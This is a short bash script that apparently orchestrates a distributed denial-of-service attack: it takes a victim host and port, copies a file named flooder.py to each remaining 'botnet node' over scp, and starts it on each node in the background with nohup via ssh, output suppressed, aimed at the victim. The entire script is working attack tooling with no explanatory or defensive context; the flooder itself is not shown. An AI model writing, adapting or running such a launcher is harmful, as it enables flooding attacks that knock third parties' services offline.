#!/bin/bash

NODES=$# # all cmd-line args
VICTIM=$1 # victim is the first arg
shift
VICTIMPORT=$1 # port is the second arg
shift

NODES=$(($NODES - 2)) # the rest are botnet nodes

for i in `seq $NODES`
do
  scp flooder.py rai@$1:~/
  ssh -t rai@$1 'nohup python flooder.py '$VICTIM' '$VICTIMPORT'&> /dev/null &'
  shift
done
